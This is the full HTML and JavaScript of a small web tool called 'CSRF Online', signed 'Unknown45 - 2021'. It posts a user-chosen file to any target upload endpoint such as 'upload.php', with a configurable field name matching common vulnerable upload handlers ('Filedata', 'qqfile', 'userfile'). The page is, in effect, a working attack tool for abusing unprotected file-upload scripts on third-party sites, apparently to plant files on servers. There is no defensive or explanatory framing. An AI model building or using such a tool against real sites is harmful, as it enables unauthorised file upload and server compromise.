<html>
<head>
<title>[+] CSRF Online [+]</title>
<meta name="viewport" content="width=device-width, initial-scale=1" /> 
<script src="https://cdn.jsdelivr.net/npm/pace-js@latest/pace.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js@latest/pace-theme-default.min.css">
</head>
<body bgcolor="#1e1e1e" text="white">
<style>
  @import url('https://fonts.googleapis.com/css?family=Staatliches');

textarea {
max-width: 90%;
width: 100%;
height: 150px;
resize: none;
outline: none;
overflow: auto;
background: transparent;
color: #ffffff;
}

button {
  background: transparent;
    font-family: Staatliches;
  color: #ffffff;
  border-color: #ffffff;
  cursor: pointer;
}

input {
  background: transparent;
  font-family: Staatliches;
  color: #ffffff;
  border-color: #ffffff;
  cursor: pointer;
  max-width: 95%;
}

font {
  font-family: Staatliches;
}

body::-webkit-scrollbar {
  width: 12px;               /* width of the entire scrollbar */
}

body::-webkit-scrollbar-track {
  background: ##1e1e1e;        /* color of the tracking area */
}

body::-webkit-scrollbar-thumb {
  background-color: ##1e1e1e;    /* color of the scroll thumb */
  border: 3px solid gray;  /* creates padding around scroll thumb */
}

.area {
  font-family: Courier;
}
</style>
<body><center>
<font face=courier new size=5>CSRF Online</font>
<hr>
<form id="myForm" method="post" enctype="multipart/form-data" target="_blank">
  <font>TARGET</font><br>
  <input type="text" name="url" size="60" height="10" placeholder="http://127.0.0.1/[path]/upload.php" style="margin: 5px auto; padding-left: 5px;" oninput="updateFormAction()" required>
  <br>
  <font>POST FILE</font><br>
  <input type="text" class="area" name="data" size="30" height="10" placeholder="Filedata / files[] / qqfile / userfile / dll" style="margin: 5px auto; padding-left: 5px;" oninput="updateFileName()" required="true">
  <br>
  <br>
  <input type="file" id="fileInput">
  <input type="submit" name="go" value="Gaskan">
</form>

<script>
  function updateFileName() {
    var textInput = document.querySelector('.area');
    var fileInput = document.getElementById('fileInput');
    fileInput.setAttribute('name', textInput.value);
  }

  function updateFormAction() {
    var targetInput = document.querySelector('input[name="url"]');
    var form = document.getElementById('myForm');
    form.setAttribute('action', targetInput.value);
  }
</script>
</form>
<center><hr><font size=3>Unknown45 - 2021
</body>
</html>

